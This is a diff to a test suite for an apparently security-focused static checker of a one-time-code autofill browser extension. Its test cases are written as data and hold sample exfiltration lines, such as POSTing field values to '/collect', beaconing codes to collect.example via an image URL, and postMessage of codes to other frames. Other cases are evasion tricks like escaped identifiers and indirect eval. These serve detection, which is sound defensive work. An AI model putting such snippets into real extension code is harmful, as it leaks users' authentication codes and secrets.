+  "    if (fields.length === 1 && el.value === '' && !(el.maxLength >= 0 && el.maxLength < code.length)) put(el, code);",
+  "    else if (fields.length === code.length) fields.forEach((box, i) => put(box, code[i]));",
+  "  }",
+  "  function put(el, value) {",
+  "    el.value = value;",
+  "    el.dispatchEvent(new Event('input', { bubbles: true }));",
+  "    el.dispatchEvent(new Event('change', { bubbles: true }));",
+  "  }",
+  "  function stop() {",
+  "    stopped = true;",
+  "    observer.disconnect();",
+  "    clearTimeout(settleTimer);",
+  "    clearTimeout(deadline);",
+  "  }",
+  "})();",
+  "",
+].join('\n');
+const FIELDFIND_SOURCE = [
+  "// One-time-code field detection; defines the zauthFieldFind global. The shapes of lib/fieldfind.js.",
+  "'use strict';",
+  "(() => {",
+  "  const NAME_PATTERN = /(otp|totp|2fa|one.?time|verification)/i;",
+  "  const NAMED_ATTRIBUTES = ['name', 'id', 'aria-label', 'placeholder'];",
+  "  const CODE_TYPES = new Set(['', 'text', 'tel', 'number']);",
+  "  const ATTRIBUTES = ['type', 'autocomplete', 'inputmode', 'maxlength', ...NAMED_ATTRIBUTES];",
+  "  function attribute(field, name) {",
+  "    const value = field && field.attrs ? field.attrs[name] : undefined;",
+  "    return typeof value === 'string' ? value : '';",
+  "  }",
+  "  function maxLength(field) {",
+  "    const raw = attribute(field, 'maxlength').trim();",
+  "    return /^\\d+$/.test(raw) ? Number(raw) : -1;",
+  "  }",
+  "  const isFillable = (field) =>",
+  "    field.visible === true && CODE_TYPES.has(attribute(field, 'type').trim().toLowerCase()) && field.disabled !== true && field.readOnly !== true && field.value === '';",
+  "  const RULES = [",
+  "    (field) => attribute(field, 'autocomplete').toLowerCase().split(/\\s+/).includes('one-time-code'),",
+  "    (field) => NAMED_ATTRIBUTES.some((name) => NAME_PATTERN.test(attribute(field, name))),",
+  "    (field) => maxLength(field) >= 6,",
+  "  ];",
+  "  function findOtpField(fields) {",
+  "    const list = Array.isArray(fields) ? fields.filter((f) => f !== null && typeof f === 'object') : [];",
+  "    for (const rule of RULES) {",
+  "      const index = list.findIndex((field) => isFillable(field) && rule(field));",
+  "      if (index !== -1) return [fields.indexOf(list[index])];",
+  "    }",
+  "    return null;",
+  "  }",
+  "  function groupOf(el) {",
+  "    const parent = el.parentElement;",
+  "    if (parent && parent.parentElement && parent.querySelectorAll('input').length === 1) return parent.parentElement;",
+  "    return parent;",
+  "  }",
+  "  function isVisible(el) {",
+  "    if (typeof el.checkVisibility === 'function') return el.checkVisibility({ visibilityProperty: true, checkVisibilityCSS: true });",
+  "    return el.getClientRects().length > 0;",
+  "  }",
+  "  function describe(el) {",
+  "    const attrs = {};",
+  "    for (const name of ATTRIBUTES) {",
+  "      const value = el.getAttribute(name);",
+  "      if (value !== null) attrs[name] = value;",
+  "    }",
+  "    return { attrs, value: typeof el.value === 'string' ? el.value : '', disabled: el.matches(':disabled'), readOnly: el.readOnly === true, visible: isVisible(el), group: groupOf(el) };",
+  "  }",
+  "  function findInDocument(root) {",
+  "    const inputs = Array.from(root.querySelectorAll('input'));",
+  "    const found = findOtpField(inputs.map(describe));",
+  "    return found ? found.map((i) => inputs[i]) : null;",
+  "  }",
+  "  globalThis.zauthFieldFind = Object.freeze({ findOtpField, findInDocument, groupOf });",
+  "})();",
   "",
 ].join('\n');
 
@@ -871,7 +1456,8 @@ const CONTENT_SOURCE = [
 // (member .open() calls, open() declarations and method shorthand, location reads, the
 // chrome.tabs reads other files may make, tabs opened through lib/nav.js, plain forms, JSDoc
 // generics, CSS data: urls, chrome.scripting in the worker, chrome.permissions in the worker
-// and the two popup files, chrome.permissions.contains/onRemoved elsewhere, a content script).
+// and the two popup files, chrome.permissions.contains/onRemoved elsewhere, and the content
+// script's two files in the shapes the real ones have, registered through a const list).
 function cleanFixture() {
   return {
     manifest: {
@@ -887,6 +1473,7 @@ function cleanFixture() {
     files: {
       'background.js': BACKGROUND_SOURCE,
       'lib/autofill-worker.js': WORKER_SOURCE,
+      'lib/fieldfind.js': FIELDFIND_SOURCE,
       'content/autofill.js': CONTENT_SOURCE,
       'popup/settings.js':
         "import * as session from './session.js';\nexport async function removeBinding(origin) {\n  await session.removeBinding(origin);\n  return chrome.permissions.contains({ origins: [`${origin}/*`] });\n}\n",
@@ -998,6 +1585,11 @@ const addJs = (rel, code) => (fx) => {
 const appendJs = (rel, code) => (fx) => {
   fx.files[rel] = `${fx.files[rel] ?? ''}${code}`;
 };
+// Replaces text that occurs exactly once in the fixture worker.
+const editWorker = (from, to) => (fx) => {
+  fx.files['lib/autofill-worker.js'] = replacedOnce(fx.files['lib/autofill-worker.js'], from, to);
+};
+const appendContent = (code) => appendJs('content/autofill.js', code);
 const setBackground = (value) => (fx) => {
   fx.manifest.background = value;
 };
@@ -1289,7 +1881,7 @@ const CASES = [
   ['scripting-in-popup', appendJs('popup/popup.js', 'chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => 0 });\n'), ['scripting-api']],
   ['scripting-in-settings', appendJs('popup/settings.js', "chrome.scripting.unregisterContentScripts({ ids: ['autofill'] });\n"), ['scripting-api']],
   ['scripting-in-background', appendJs('background.js', 'chrome.scripting.registerContentScripts([]);\n'), ['scripting-api']],
-  ['scripting-in-content-script', appendJs('content/autofill.js', 'chrome.scripting.getRegisteredContentScripts();\n'), ['scripting-api']],
+  ['scripting-in-content-script', appendJs('content/autofill.js', 'chrome.scripting.getRegisteredContentScripts();\n'), ['scripting-api', 'content-script-sinks'], /chrome other than/],
   ['scripting-in-nav', (fx) => (fx.files['lib/nav.js'] = `${NAV_WRAPPER_SOURCE}chrome.scripting.executeScript(o);\n`), ['scripting-api', 'nav-wrapper']],
   ['scripting-alias', addJs('lib/x.js', 'const s = chrome.scripting;\ns.executeScript(o);\n'), ['scripting-api']],
   ['scripting-optional-chain', addJs('lib/x.js', 'chrome?.scripting?.executeScript(o);\n'), ['scripting-api']],
@@ -1309,7 +1901,7 @@ const CASES = [
   ['permissions-request-in-settings', appendJs('popup/settings.js', 'chrome.permissions.request({ origins: [o] });\n'), ['permissions-api']],
   ['permissions-remove-in-background', appendJs('background.js', 'chrome.permissions.remove({ origins: [o] });\n'), ['permissions-api']],
   ['permissions-getall-in-session', appendJs('popup/session.js', 'export const all = () => chrome.permissions.getAll();\n'), ['permissions-api']],
-  ['permissions-request-in-content-script', appendJs('content/autofill.js', "chrome.permissions.request({ origins: ['<all_urls>'] });\n"), ['permissions-api']],
+  ['permissions-request-in-content-script', appendJs('content/autofill.js', "chrome.permissions.request({ origins: ['<all_urls>'] });\n"), ['permissions-api', 'content-script-sinks'], /chrome other than/],
   ['permissions-request-in-nav', (fx) => (fx.files['lib/nav.js'] = `${NAV_WRAPPER_SOURCE}chrome.permissions.request(o);\n`), ['permissions-api', 'nav-wrapper']],
   ['permissions-host-access-request', addJs('lib/x.js', 'chrome.permissions.addHostAccessRequest({ tabId: 1 });\n'), ['permissions-api']],
   ['permissions-alias', addJs('lib/x.js', 'const p = chrome.permissions;\np.request(o);\n'), ['permissions-api']],
@@ -1317,16 +1909,166 @@ const CASES = [
   ['permissions-optional-chain', addJs('lib/x.js', 'chrome?.permissions?.request(o);\n'), ['permissions-api']],
   ['permissions-in-comment', addJs('lib/x.js', '// chrome.permissions.remove is for the worker\n'), ['permissions-api']],
   // The content script runs in web pages, outside the extension-page CSP: every source rule
-  // applies to it as to any other file.
-  ['content-fetch', appendJs('content/autofill.js', "fetch('/collect', { method: 'POST', body: field.value });\n"), ['network-api']],
-  ['content-sendbeacon', appendJs('content/autofill.js', "navigator.sendBeacon('/collect', field.value);\n"), ['network-api']],
-  ['content-websocket', appendJs('content/autofill.js', "export const w = new WebSocket('wss://x');\n"), ['network-api']],
-  ['content-eval', appendJs('content/autofill.js', 'eval(field.value);\n'), ['dynamic-code']],
-  ['content-string-timer', appendJs('content/autofill.js', "setTimeout('fill()', 10);\n"), ['dynamic-code']],
-  ['content-url-string', appendJs('content/autofill.js', "const collector = 'https://collect.example/';\n"), ['remote-url']],
-  ['content-location-assign', appendJs('content/autofill.js', "location.href = '/next';\n"), ['navigation']],
-  ['content-window-open', appendJs('content/autofill.js', "window.open('/x');\n"), ['navigation']],
-  ['content-frame-in-string', appendJs('content/autofill.js', "document.body.insertAdjacentHTML('beforeend', '<iframe src=\"/x\"></iframe>');\n"), ['navigation']],
+  // applies to it as to any other file, and content-script-sinks on top. Each case below that
+  // also breaks the content-script lists says which part of them it breaks.
+  ['content-fetch', appendContent("fetch('/collect', { method: 'POST', body: field.value });\n"), ['network-api', 'content-script-sinks'], /fetch in a content script/],
+  ['content-sendbeacon', appendContent("navigator.sendBeacon('/collect', field.value);\n"), ['network-api', 'content-script-sinks'], /\.sendBeacon is not on/],
+  ['content-websocket', appendContent("export const w = new WebSocket('wss://x');\n"), ['network-api', 'content-script-sinks'], /new WebSocket \(/],
+  ['content-eval', appendContent('eval(field.value);\n'), ['dynamic-code', 'content-script-sinks'], /eval in a content script/],
+  ['content-string-timer', appendContent("setTimeout('fill()', 10);\n"), ['dynamic-code', 'content-script-sinks'], /setTimeout whose first argument/],
+  // An absolute URL is the remote-url rule's; content-script-sinks adds no second finding for it.
+  ['content-url-string', appendContent("const collector = 'https://collect.example/';\n"), ['remote-url']],
+  ['content-location-assign', appendContent("location.href = '/next';\n"), ['navigation', 'content-script-sinks'], /\.href is not on/],
+  ['content-window-open', appendContent("window.open('/x');\n"), ['navigation', 'content-script-sinks'], /\.open is not on/],
+  ['content-frame-in-string', appendContent("document.body.insertAdjacentHTML('beforeend', '<iframe src=\"/x\"></iframe>');\n"), ['navigation', 'content-script-sinks'], /\.insertAdjacentHTML is not on/],
+
+  // content-script-sinks: what the content script may touch, by allowlist. Loading something
+  // from the page: an element that loads, a URL-taking property or attribute, markup, a style
+  // with url(, a worker, a dynamic import.
+  ['content-new-image-src', appendContent("new Image().src = '//collect.example/p?c=' + code;\n"), ['content-script-sinks'], /new Image \(a content script constructs only/],
+  ...['img', 'script', 'link', 'iframe'].map((tag) => [`content-create-element-${tag}`, appendContent(`const el2 = document.createElement('${tag}');\n`), ['content-script-sinks'], /\.createElement is not on/]),
+  ...['src', 'href', 'srcset', 'action', 'data', 'poster', 'background'].map((prop) => [
+    `content-set-${prop}`,
+    appendContent(`field.${prop} = u;\n`),
+    ['content-script-sinks'],
+    new RegExp(`\\.${prop} is not on the content-script member list`),
+  ]),
+  ['content-setattribute-src', appendContent("field.setAttribute('src', u);\n"), ['content-script-sinks'], /\.setAttribute is not on/],
+  ['content-setattribute-href', appendContent("field.setAttribute('href', u);\n"), ['content-script-sinks'], /names a URL or markup sink/],
+  ['content-insertadjacenthtml', appendContent("field.insertAdjacentHTML('afterend', '<img src=x>');\n"), ['content-script-sinks'], /\.insertAdjacentHTML is not on/],
+  ['content-innerhtml', appendContent("field.parentElement.innerHTML = '<img src=x>';\n"), ['content-script-sinks'], /\.innerHTML is not on/],
+  ['content-outerhtml', appendContent('field.outerHTML = markup;\n'), ['content-script-sinks'], /\.outerHTML is not on/],
+  ['content-document-write', appendContent("document.write('<img src=x>');\n"), ['content-script-sinks'], /\.write is not on/],
+  ['content-style-background-image', appendContent("field.style.backgroundImage = 'url(/p)';\n"), ['content-script-sinks'], /\.backgroundImage is not on/],
+  ['content-style-csstext', appendContent("field.style.cssText = 'background: url(/p)';\n"), ['content-script-sinks'], /\.cssText is not on/],
+  ['content-link-prefetch', appendContent("const l = document.createElement('link');\nl.rel = 'prefetch';\nl.href = '/p';\ndocument.head.append(l);\n"), ['content-script-sinks'], /\.append is not on/],
+  ['content-dynamic-import', appendContent("import('/x.js');\n"), ['content-script-sinks'], /import in a content script/],
+  ['content-worker', appendContent("new Worker('/w.js');\n"), ['content-script-sinks'], /new Worker \(/],
+  ['content-shared-worker', appendContent("new SharedWorker('/w.js');\n"), ['content-script-sinks'], /new SharedWorker \(/],
+  // Handing data to another site: postMessage (the parent, top or opener of a bound frame may be
+  // another site) and window.name (kept across navigation to another site).
+  ['content-postmessage-parent', appendContent("parent.postMessage(code, '*');\n"), ['content-script-sinks'], /\.postMessage is not on/],
+  ['content-postmessage-top', appendContent("window.top.postMessage({ code }, '*');\n"), ['content-script-sinks'], /\.postMessage is not on/],
+  ['content-postmessage-bare', appendContent("postMessage(code, '*');\n"), ['content-script-sinks'], /postMessage in a content script/],
+  ['content-window-name', appendContent('window.name = code;\n'), ['content-script-sinks'], /\.name is not on/],
+  ['content-bare-name', appendContent('name = code;\n'), ['content-script-sinks'], /window\.name/],
+  // chrome: only chrome.runtime.sendMessage and chrome.runtime.id.
+  ['content-chrome-connect', appendContent('chrome.runtime.connect().postMessage(code);\n'), ['content-script-sinks'], /chrome other than/],
+  ['content-chrome-storage', appendContent("chrome.storage.local.get('vault');\n"), ['content-script-sinks'], /chrome other than/],
+  ['content-chrome-geturl', appendContent("const page = chrome.runtime.getURL('popup/popup.html');\n"), ['content-script-sinks'], /chrome other than/],
+  ['content-chrome-optional-chain', appendContent('chrome?.runtime?.connect();\n'), ['content-script-sinks'], /chrome other than/],
+  // Other spellings of a member, and calls the member list cannot see.
+  ['content-computed-string-key', appendContent("field['src'] = u;\n"), ['content-script-sinks'], /computed member access with a string key/],
+  ['content-computed-concat-key', appendContent("field['sr' + 'c'] = u;\n"), ['content-script-sinks'], /computed member access with a string key/],
+  ['content-computed-template-key', appendContent('field[`src`] = u;\n'), ['content-script-sinks'], /computed member access with a string key/],
+  ['content-computed-call', appendContent('field[method](u);\n'), ['content-script-sinks'], /computed member call/],
+  ['content-optional-member', appendContent("field?.setAttribute('srcset', u);\n"), ['content-script-sinks'], /\.setAttribute is not on/],
+  ['content-comment-between', appendContent('field /* x */ .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
+  ['content-newline-between', appendContent('field\n  .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
+  ['content-escaped-identifier', appendContent('field.\\u0073rc = u;\n'), ['content-script-sinks'], /backslash outside a string/],
+  ['content-string-escape', appendContent("const key = '\\x73rc';\nfield[key] = u;\n"), ['content-script-sinks'], /escape \\x in a string/],
+  ['content-sink-name-string', appendContent("const key = 'src';\nfield[key] = u;\n"), ['content-script-sinks'], /"src" names a URL or markup sink/],
+  // A line comment ends at U+2028 as at '\n': what follows on the same line is code.
+  ['content-line-separator-ends-comment', appendContent(`// note${String.fromCharCode(0x2028)}field.src = u;\n`), ['content-script-sinks'], /\.src is not on/],
+  ['content-number-member', appendContent("1..constructor.constructor('return 1')();\n"), ['content-script-sinks'], /\.constructor is not on/],
+  ['content-template-substitution', appendContent('const shown = `${field.src}`;\n'), ['content-script-sinks'], /\.src is not on/],
+  ['content-new-alias', appendContent('const Pic = Image;\nnew Pic();\n'), ['content-script-sinks'], /new Pic \(/],
+  ['content-function-call', appendContent("Function('return 1')();\n"), ['content-script-sinks'], /Function in a content script/],
+  ['content-indirect-eval', appendContent('(0, eval)(code);\n'), ['content-script-sinks'], /eval in a content script/],
+  ['content-with-statement', appendContent("with (document) { write('x'); }\n"), ['content-script-sinks'], /with in a content script/],
+  ['content-timer-variable', appendContent('setTimeout(code, 10);\n'), ['content-script-sinks'], /setTimeout whose first argument is not a function/],
+  ['content-timer-alias', appendContent('const later = setInterval;\n'), ['content-script-sinks'], /setInterval other than called directly/],
+  // A property named without a '.': object destructuring, in a declaration, an assignment or a
+  // parameter list. Also the attribute nodes, whose value is the attribute's (an existing src).
+  ['content-destructure-write', appendContent("const { write } = document;\n['<img src=x>'].forEach(write, document);\n"), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-renamed', appendContent('const { body: page } = document;\n'), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-assignment', appendContent('let w;\n({ write: w } = document);\n'), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-for-of', appendContent('for (const { src } of list) look(src);\n'), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-arrow-param', appendContent("const put2 = ({ insertAdjacentHTML }) => insertAdjacentHTML('afterend', m);\n"), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-function-param', appendContent('function grab({ cookie }) { return cookie; }\n'), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-destructure-catch-param', appendContent('try { look(); } catch ({ message }) { look(message); }\n'), ['content-script-sinks'], /object destructuring pattern/],
+  ['content-attributes-write', appendContent('Array.from(field.attributes).forEach((a) => { a.value = u; });\n'), ['content-script-sinks'], /\.attributes is not on/],
+  // A '/' that may be division or a regular expression is not guessed at: either guess can put
+  // later code inside a literal the scan skips.
+  ['content-slash-after-paren', appendContent("if (field) /'/.test(code); field.src = u; const q = '/';\n"), ['content-script-sinks'], /'\/' right after '\)'/],
+  ['content-slash-after-brace', appendContent('if (code) { look(); } /x/.test(code);\n'), ['content-script-sinks'], /'\/' right after '\}'/],
+  ['content-slash-after-of', appendContent('const of = 4;\nconst half = of / 2;\n'), ['content-script-sinks'], /'\/' right after 'of'/],
+  ['ok-content-array-destructuring-and-literals', appendContent("const [first, second] = [1, 2];\nconst opts = { once: true, bubbles: false };\nconst half = code.length / 2;\nfunction take(a, [b] = []) { return a + b + first + second + half; }\nwindow.addEventListener('load', look, opts);\n"), []],
+  // Acting on the page: other events, clicks and submissions.
+  ['content-custom-event', appendContent("field.dispatchEvent(new CustomEvent('x', { detail: code }));\n"), ['content-script-sinks'], /new CustomEvent \(/],
+  ['content-event-type', appendContent("field.dispatchEvent(new Event('submit', { bubbles: true }));\n"), ['content-script-sinks'], /new Event\( other than 'input' or 'change'/],
+  ['content-event-type-variable', appendContent('field.dispatchEvent(new Event(type));\n'), ['content-script-sinks'], /new Event\( other than/],
+  ['content-click', appendContent('button.click();\n'), ['content-script-sinks'], /\.click is not on/],
+  ['content-submit', appendContent('form.requestSubmit();\n'), ['content-script-sinks'], /\.requestSubmit is not on/],
+  // Strings that are a URL or a style that loads one.
+  ['content-protocol-relative-string', appendContent("const beacon = '//collect.example/p';\n"), ['content-script-sinks'], /protocol-relative URL/],
+  ['content-css-url-string', appendContent("const css = 'background: url(/p)';\n"), ['content-script-sinks'], /holds a CSS url\(/],
+  // What the scan cannot read fails rather than passing unread.
+  ['content-unterminated-string', appendContent("const s = 'abc;\n"), ['content-script-sinks'], /unterminated string literal/],
+  ['content-unterminated-comment', appendContent('/* never closed\nfield.src = u;\n'), ['content-script-sinks'], /unterminated comment/],
+  // Both files are held to it, lib/fieldfind.js as much as content/autofill.js.
+  ['content-fieldfind-scanned', appendJs('lib/fieldfind.js', "globalThis.parent.postMessage(1, '*');\n"), ['content-script-sinks'], /fieldfind\.js:\d+ \.parent is not on/],
+  // Must stay clean: the listeners, timers and reads the content script may add; sink names in
+  // comments and regular expressions; the same sinks outside the content-script files.
+  [
+    'ok-content-listeners-and-timers',
+    appendContent(
+      [
+        "window.addEventListener('load', () => look(), { once: true });",
+        "window.addEventListener('pageshow', (event) => { if (event.persisted) look(); });",
+        "document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && !document.hidden) schedule(); });",
+        "window.addEventListener('resize', schedule);",
+        "window.removeEventListener('resize', schedule);",
+        'const relook = setInterval(look, 500);',
+        'const again = setTimeout(() => look(), 500);',
+        'const frame = requestAnimationFrame(() => look());',
+        'clearInterval(relook);',
+        'clearTimeout(again);',
+        'cancelAnimationFrame(frame);',
+        "if (document.readyState === 'complete') look();",
+        '',
+      ].join('\n'),
+    ),
+    [],
+  ],
+  [
+    'ok-content-dom-reads',
+    appendContent(
+      [
+        'function shown(el) {',
+        '  const box = el.getBoundingClientRect();',
+        '  const style = getComputedStyle(el);',
+        "  return box.width > 0 && box.height > 0 && style.display !== 'none' && style.visibility !== 'hidden';",
+        '}',
+        'const later = setTimeout(shown, 10);',
+        'const ready = () => shown(document);',
+        'setInterval(ready, 500);',
+        '',
+      ].join('\n'),
+    ),
+    [],
+  ],
+  [
+    'ok-content-sink-names-not-code',
+    appendContent("// never set .src, .href, .innerHTML or a style; no new Image(), postMessage, import() or Worker\n/* field.src = '//x'; parent.postMessage(code, '*'); window.name = code */\nconst IGNORED = /src|href|postMessage|url\\(/;\n"),
+    [],
+  ],
+  ['ok-sinks-outside-content-scripts', appendJs('popup/popup.js', "export const preview = (img, u) => { img.src = u; img.setAttribute('srcset', u); };\n"), []],
+  // The worker's registration names exactly contentScriptFiles, as a literal list or through one
+  // const used nowhere else; any other file, or a list the scan cannot read, fails.
+  ['ok-registration-literal-list', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', 'content/autofill.js']"), []],
+  ['registration-other-file-literal', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', 'content/other.js']"), ['content-script-sinks'], /js: names content\/other\.js, not one of contentScriptFiles/],
+  ['registration-other-file-const', editWorker("'content/autofill.js'];", "'content/other.js'];"), ['content-script-sinks'], /js: names content\/other\.js, not one of contentScriptFiles/],
+  ['registration-extra-file-const', editWorker("'content/autofill.js'];", "'content/autofill.js', 'content/other.js'];"), ['content-script-sinks'], /js: names content\/other\.js/],
+  ['registration-quoted-key', editWorker('js: CONTENT_SCRIPTS', "'js': ['content/other.js']"), ['content-script-sinks'], /js: names content\/other\.js/],
+  ['registration-const-mutated', appendJs('lib/autofill-worker.js', "CONTENT_SCRIPTS.push('content/other.js');\n"), ['content-script-sinks'], /js: is not a list of string literals/],
+  ['registration-computed-list', editWorker('js: CONTENT_SCRIPTS', 'js: CONTENT_SCRIPTS.concat(extra)'), ['content-script-sinks'], /js: is not a list of string literals/],
+  ['registration-list-with-variable', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', extra]"), ['content-script-sinks'], /js: is not a list of string literals/],
+  ['registration-shorthand', editWorker('js: CONTENT_SCRIPTS', 'js'), ['content-script-sinks'], /js named other than as the js: key/],
+  ['registration-member-assignment', appendJs('lib/autofill-worker.js', "export function widen(script) { script.js = ['content/other.js']; }\n"), ['content-script-sinks'], /js named other than as the js: key/],
+  ['registration-without-js-key', editWorker(', js: CONTENT_SCRIPTS', ''), ['content-script-sinks'], /(?:register|update)ContentScripts without a js: key/],
+  ['registration-unreadable', appendJs('lib/autofill-worker.js', 'const broken = `x;\n'), ['content-script-sinks'], /cannot be read/],
+  ['content-script-file-missing', (fx) => delete fx.files['lib/fieldfind.js'], ['content-script-sinks'], /missing \(listed in contentScriptFiles\)/],
 
   ['inline-script-body', addHtml('<script>document.title = 1;</script>'), ['inline-script']],
   [
